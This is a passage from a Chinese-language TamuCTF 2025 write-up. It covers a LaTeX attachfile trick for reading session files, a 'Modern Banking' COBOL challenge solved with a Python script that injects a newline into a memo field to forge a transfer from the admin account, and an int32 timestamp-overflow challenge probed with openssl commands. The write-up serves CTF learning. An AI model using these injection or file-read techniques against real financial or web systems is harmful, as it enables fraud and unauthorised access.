<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\documentclass</span>&#123;article&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;attachfile&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;document&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\attachfile</span>&#123;./sess<span class="built_in">_</span>a4c53297477c46a4bcfda34c03b9b99e&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\end</span>&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p>获取到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid—s:104:”af5fa90124b49374cc8a5252a4296d7eebf78c54e89253143eef29df75cbc6f1acca0fb004a92b003</span><br></pre></td></tr></table></figure>

<p>但是这些都没有任何的作用，我们可以注意到文件中是通过session进行检验的，所以可以尝试把所有<code>sess_id</code>自己套上就这样获得了flag，弯弯真是多</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250331-161631.jpg" alt="1"></p>
<h2 id="Modern-Banking-7-solves"><a href="#Modern-Banking-7-solves" class="headerlink" title="Modern Banking(7 solves)"></a>Modern Banking(7 solves)</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">port=<span class="variable">$PORT</span></span><br><span class="line"></span><br><span class="line">/usr/sbin/nginx</span><br><span class="line"><span class="built_in">rm</span> -f /var/run/fcgiwrap.socket</span><br><span class="line"><span class="built_in">nohup</span> /usr/sbin/fcgiwrap -f -s unix:/var/run/fcgiwrap.socket &amp;</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"><span class="built_in">chmod</span> a+rw /var/run/fcgiwrap.socket</span><br><span class="line"><span class="built_in">chmod</span> -R a+rx /var/www</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Port: <span class="variable">$port</span>&quot;</span></span><br><span class="line">    curl -s <span class="string">&quot;localhost:<span class="variable">$port</span>?page=register&quot;</span> --data-raw <span class="string">&quot;action=register&amp;username=administrator&amp;password=<span class="variable">$PASS</span>&quot;</span> &gt;/dev/null</span><br><span class="line">    cookie=<span class="string">&quot;<span class="subst">$(curl -v <span class="string">&quot;localhost:<span class="variable">$port</span>?page=login&quot;</span> --data-raw <span class="string">&quot;action=login&amp;username=administrator&amp;password=<span class="variable">$PASS</span>&quot;</span> 2&gt;&amp;1 | grep Set-Cookie | cut -d&#x27; &#x27; -f3)</span>&quot;</span></span><br><span class="line">    account=<span class="string">&quot;<span class="subst">$(curl <span class="string">&quot;localhost:<span class="variable">$port</span>?page=home&quot;</span> -b <span class="string">&quot;<span class="variable">$cookie</span>&quot;</span> | grep <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> | head -n1 | cut -d&#x27;&gt;&#x27; -f3)</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$account</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        curl -s <span class="string">&quot;localhost:<span class="variable">$port</span>?page=manage&quot;</span> -b <span class="string">&quot;<span class="variable">$cookie</span>&quot;</span> --data-raw <span class="string">&quot;action=new&quot;</span> &gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    curl -s <span class="string">&quot;localhost:<span class="variable">$port</span>?page=admin&quot;</span> -b <span class="string">&quot;<span class="variable">$cookie</span>&quot;</span> --data-raw <span class="string">&quot;action=refresh&amp;account=1&amp;secret=<span class="variable">$SECRET</span>&quot;</span> &gt;/dev/null</span><br><span class="line">    curl -s <span class="string">&quot;localhost:<span class="variable">$port</span>?page=batch&quot;</span> -b <span class="string">&quot;<span class="variable">$cookie</span>&quot;</span> --data-raw <span class="string">&quot;action=batch&amp;secret=<span class="variable">$SECRET</span>&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> 20</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>看到了用户名，并且发现这是个cob应用，这个代码直接从来没有见过，所以都是让AI来帮我看，发现如果是管理员就可以给指定账户转足够的钱去购买flag，卡着了没做出来，后面再看题目的时候发现出题人偷偷把题目改了，现在每个人可以进行用户的管理，最多创建8个用户</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250330-214721.jpg" alt="1"></p>
<p>还是来看看代码，在VSOCDE下载一个COBOL插件就可以看代码了，看到路由部分的时候发现</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250330-221929.jpg" alt="1"></p>
<p>登录然后访问<code>?page=admin</code>发现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;h3&gt;Your accounts ( 1</span></span><br><span class="line"><span class="comment">)&lt;/h3&gt;&lt;p&gt;&lt;table&gt;&lt;tr&gt;&lt;th&gt;Account&lt;/th&gt;&lt;th&gt;Balance&lt;/th&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="comment">&lt;tr&gt;&lt;td&gt;339984317737</span></span><br><span class="line"><span class="comment">&lt;/td&gt;&lt;td&gt; $999999999999999999.99</span></span><br><span class="line"><span class="comment">&lt;/td&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="comment">&lt;/table&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>也就是说339984317737用户有足够多的钱来购买flag，草草的看完了代码，想到了两种方式，第一种刷新出来这个用户，用它买flag，第二种成为admin，通过注入<code>banlance</code>的手法打钱给账户，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">016410   MOVE &quot;action&quot; to Datatarget</span><br><span class="line">016420   PERFORM 100-Parse-Data</span><br><span class="line">016430   IF Datadone = 1 AND Dataval = &quot;refresh&quot;</span><br><span class="line">016440     MOVE &quot;account&quot; to Datatarget</span><br><span class="line">016450     PERFORM 100-Parse-Data</span><br><span class="line">016460</span><br><span class="line">016470     IF Datadone = 1 AND Dataval &gt; 0 AND Dataval &lt;=</span><br><span class="line">016500       AccountCount</span><br><span class="line">016510       MOVE Dataval TO AccountInd</span><br><span class="line">016520       MOVE Account IN AccountList (AccountInd) TO Account OF</span><br><span class="line">016530       AccountRecord</span><br><span class="line">016540       PERFORM 104-DB-GetAccount</span><br><span class="line">016550</span><br><span class="line">016560       MOVE 999999999999999999.99 TO Balance</span><br><span class="line">016570       OPEN I-O ACCOUNTS</span><br><span class="line">016600         REWRITE AccountRecord</span><br><span class="line">016610       CLOSE ACCOUNTS</span><br><span class="line">016620     END-IF</span><br><span class="line">016630   END-IF</span><br></pre></td></tr></table></figure>

<p>看到代码发现</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250331-175409.jpg" alt="1"></p>
<p>也就是说momo也会注入到数据中，那我们换行不就可以用那个巨额账号的钱转出来了嘛，但是写金额的时候有个问题就是代码中写到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">05 Balance PIC 9(18)V99 VALUE 0.</span><br></pre></td></tr></table></figure>

<p>余额格式为 20 位数，并且COBOL 通常使用固定长度字段来表示数据，注册用户之后的一键脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Target server URL</span></span><br><span class="line"><span class="comment">#url = &quot;http://localhost:8888&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://modern-banking.tamuctf.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attacker&#x27;s credentials (register first if needed)</span></span><br><span class="line">username = <span class="string">&quot;baozongwi&quot;</span></span><br><span class="line">password = <span class="string">&quot;baozongwi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Login to get session cookie</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">login_data = &#123;</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;login&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: password</span><br><span class="line">&#125;</span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=login&quot;</span>, data=login_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get admin account</span></span><br><span class="line">response = session.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=admin&quot;</span>)</span><br><span class="line">account_line = [line <span class="keyword">for</span> line <span class="keyword">in</span> response.text.split(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">if</span> <span class="string">&#x27;&lt;tr&gt;&lt;td&gt;&#x27;</span> <span class="keyword">in</span> line][<span class="number">0</span>]</span><br><span class="line">admin_account = account_line.split(<span class="string">&#x27;&lt;td&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;admin_account&#x27;</span>, admin_account)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create, get our account</span></span><br><span class="line">session.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=manage&quot;</span>, data=&#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;new&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">response = session.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=home&quot;</span>)</span><br><span class="line">account_line = [line <span class="keyword">for</span> line <span class="keyword">in</span> response.text.split(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">if</span> <span class="string">&#x27;&lt;tr&gt;&lt;td&gt;&#x27;</span> <span class="keyword">in</span> line][<span class="number">0</span>]</span><br><span class="line">attacker_account = account_line.split(<span class="string">&#x27;&lt;td&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;attacker_account&#x27;</span>, attacker_account)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject malicious transaction</span></span><br><span class="line">linesep = <span class="string">&quot;%0A&quot;</span></span><br><span class="line">credit = <span class="string">&quot;00000000000100000000&quot;</span></span><br><span class="line">record = <span class="string">f&quot;<span class="subst">&#123;admin_account&#125;</span> <span class="subst">&#123;attacker_account&#125;</span> <span class="subst">&#123;credit&#125;</span> A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cobol_read</span>(<span class="params">x, l</span>):</span><br><span class="line">    <span class="keyword">return</span> record[x-<span class="number">1</span> : x-<span class="number">1</span>+l]</span><br><span class="line"></span><br><span class="line">src = cobol_read(<span class="number">1</span>, <span class="number">12</span>)</span><br><span class="line">dst = cobol_read(<span class="number">14</span>, <span class="number">12</span>)</span><br><span class="line">credit = cobol_read(<span class="number">27</span>, <span class="number">20</span>)</span><br><span class="line">memo = cobol_read(<span class="number">48</span>, <span class="number">110</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(record)</span><br><span class="line"><span class="built_in">print</span>(src)</span><br><span class="line"><span class="built_in">print</span>(dst)</span><br><span class="line"><span class="built_in">print</span>(credit)</span><br><span class="line"><span class="built_in">print</span>(memo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># transact_data = &#123;</span></span><br><span class="line"><span class="comment">#     &quot;action&quot;: &quot;send&quot;,</span></span><br><span class="line"><span class="comment">#     &quot;send_account&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="comment">#     &quot;receive_account&quot;: attacker_account,</span></span><br><span class="line"><span class="comment">#     &quot;amount&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="comment">#     &quot;memo&quot;: f&quot;hi&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">transact_data=<span class="string">f&#x27;action=send&amp;send_account=1&amp;receive_account=<span class="subst">&#123;attacker_account&#125;</span>&amp;amount=1&amp;memo=A<span class="subst">&#123;linesep&#125;</span><span class="subst">&#123;record&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(transact_data)</span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=transact&quot;</span>,</span><br><span class="line">    data=transact_data.encode(),</span><br><span class="line">    headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for batch processing (every 20 seconds)</span></span><br></pre></td></tr></table></figure>

<p>再登录一下发现就可以成功买flag了，而这问题我不知道为什么会这样，为什么会行一行的去处理，看到代码的最开始</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250331-180630.jpg" alt="1"></p>
<h2 id="Forward-to-the-Past-53-solves"><a href="#Forward-to-the-Past-53-solves" class="headerlink" title="Forward to the Past(53 solves)"></a>Forward to the Past(53 solves)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// External database submission API</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">submit_registration</span><span class="params">(<span class="type">int32_t</span> timestamp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">validate_future_date</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> tm *input_date)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_help</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">date_input</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">time_t</span> current_time;</span><br><span class="line">    time(&amp;current_time);</span><br><span class="line"></span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nOptions:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1. Submit travel registration\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2. View help\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Choose an option: &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> choice;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nEnter travel date (YYYY-MM-DD): &quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d-%d-%d&quot;</span>, &amp;date_input.tm_year, &amp;date_input.tm_mon, &amp;date_input.tm_mday) != <span class="number">3</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Invalid date format\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Normalize input</span></span><br><span class="line">                date_input.tm_year -= <span class="number">1900</span>;</span><br><span class="line">                date_input.tm_mon -= <span class="number">1</span>;</span><br><span class="line">                date_input.tm_hour = <span class="number">12</span>;</span><br><span class="line">                date_input.tm_min = date_input.tm_sec = <span class="number">0</span>;</span><br><span class="line">                date_input.tm_isdst = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!validate_future_date(&amp;date_input)) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\nDate must be in the future!\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Submit to database (file not provided)</span></span><br><span class="line">                <span class="type">int32_t</span> time = mktime(&amp;date_input);</span><br><span class="line">                submit_registration(time);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                print_help();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nExiting system\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nInvalid option\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">validate_future_date</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> tm *input_date)</span> &#123;</span><br><span class="line">    <span class="type">time_t</span> input_time = mktime((<span class="keyword">struct</span> tm *)input_date);</span><br><span class="line">    <span class="type">time_t</span> current_time;</span><br><span class="line">    time(&amp;current_time);</span><br><span class="line">    <span class="keyword">return</span> input_time &gt; current_time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=== University Travel Registration System ===\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NOTICE: All student travel must be registered\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;        at least 72 hours in advance\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_help</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nSystem accepts dates in YYYY-MM-DD format\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Travel must be registered before departure\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要问题就是这里</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250329-165819.jpg" alt="1"></p>
<p>不让提交过去的时间，很明显有溢出漏洞，但是溢出了又能怎么样呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123; printf &quot;1\n-2147481949-3-21\n&quot;; &#125; | openssl s_client -connect tamuctf.com:443 -servername tamuctf_forward-to-the-past -quiet</span><br><span class="line">过了，无flag</span><br><span class="line">&#123; printf &quot;1\n-9223372036854775809-3-21\n&quot;; &#125; | openssl s_client -connect tamuctf.com:443 -servername tamuctf_forward-to-the-past -quiet</span><br><span class="line">没过，无flag</span><br></pre></td></tr></table></figure>

<p>总觉得晕头转向，重新读一下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">submit_registration</span><span class="params">(<span class="type">int32_t</span> timestamp)</span>;</span><br></pre></td></tr></table></figure>

<p>外部函数声明，说明可能服务端是<code>int32_t</code>，所以在这里可能就有差异，且<code>validate_future_date</code>算的是时间戳大小来比较是否是未来，写个脚本来让看看二者如果进行强制转换的话时间是否不同</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">date_to_timestamp</span>(<span class="params">date_str</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绝对安全的日期转时间戳（支持任意年份）&quot;&quot;&quot;</span></span><br><span class="line">    dt = datetime.strptime(date_str, <span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line">    epoch = datetime(<span class="number">1970</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>((dt - epoch).total_seconds())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timestamp_to_date</span>(<span class="params">timestamp</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;支持所有时间戳的日期转换&quot;&quot;&quot;</span></span><br><span class="line">    epoch = datetime(<span class="number">1970</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (epoch + timedelta(seconds=timestamp)).strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;时间戳转换演示（支持超大年份）&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            date_str = <span class="built_in">input</span>(<span class="string">&quot;输入日期 (格式：YYYY-MM-DD，直接回车退出): &quot;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> date_str:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;程序结束&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算64位时间戳</span></span><br><span class="line">            t_64bit = date_to_timestamp(date_str)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 强制转为32位（模拟2038问题）</span></span><br><span class="line">            t_32bit = ctypes.c_int32(t_64bit).value</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 输出结果</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n原始日期: <span class="subst">&#123;date_str&#125;</span>&quot;</span>)</span><br><span class="line">            <span 